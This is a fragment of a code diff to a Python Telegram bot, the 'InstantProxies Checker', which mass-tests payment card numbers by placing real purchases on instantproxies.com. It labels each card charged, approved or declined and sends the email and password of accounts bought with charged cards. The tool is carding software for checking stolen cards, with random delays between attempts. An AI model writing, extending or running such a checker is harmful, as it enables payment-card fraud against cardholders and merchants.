         emoji={"CHARGED":"🟢","APPROVED":"🟡","DECLINED":"🔴"}.get(status,"⚠️")
         rl=f"{emoji} `{card['number'][:6]}...{card['number'][-4:]}` — {msg_text}"
-        if email and status=="CHARGED": rl+=f"\n📧 `{email}` | 🔑 `{password}`\n🌐 instantproxies.com | {plan_info['name']} | {bw}\n✅ VERIFIED REAL PURCHASE"
+        if email and status=="CHARGED": rl+=f"\n📧 `{email}` | 🔑 `{password}`\n🌐 instantproxies.com | {plan_info['name']} | {bw}\n✅ VERIFIED"
         try: await context.bot.send_message(chat_id, rl, parse_mode=ParseMode.MARKDOWN)
         except Exception: pass
         
@@ -721,17 +590,13 @@ async def _run_mass_check(update, context, uid: int, st: Dict):
         await asyncio.sleep(random.uniform(0.15,0.4))
     
     if uid in active_tasks: del active_tasks[uid]
-    await context.bot.send_message(chat_id, f"✅ *Done!*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 {total}\n🔥 Purchased: {ch}\n🟡 Approved: {ap}\n🔴 Declined: {de}\n⚠️ Errors: {er}\n━━━━━━━━━━━━━━━━━━━━━━\n🔍 100% Verified — Real purchases only\n/charged — View accounts\n👨‍💻 Made by @hey\\_berlin", parse_mode=ParseMode.MARKDOWN)
+    await context.bot.send_message(chat_id, f"✅ *Done!*\n━━━━━━━━━━━━━━━━━━━━━━\n📝 {total}\n🔥 Purchased: {ch}\n🟡 Approved: {ap}\n🔴 Declined: {de}\n⚠️ Errors: {er}\n━━━━━━━━━━━━━━━━━━━━━━\n🔍 100% Verified\n/charged — View accounts\n👨‍💻 Made by @hey\\_berlin", parse_mode=ParseMode.MARKDOWN)
 
-# ============================================
-# MAIN
-# ============================================
 def main():
     global bot_ready
     print("="*60)
     print(f"🛡️ InstantProxies Checker | @hey_berlin")
-    print(f"📋 Plans: RP_1 ($10) | RP_2 ($25) | RP_3 ($50)")
-    print(f"📱 Auto Phone Number | 🔍 100% Verified")
+    print(f"📋 RP_1 ($10) | RP_2 ($25) | RP_3 ($50)")
     print("="*60)
     
     try:
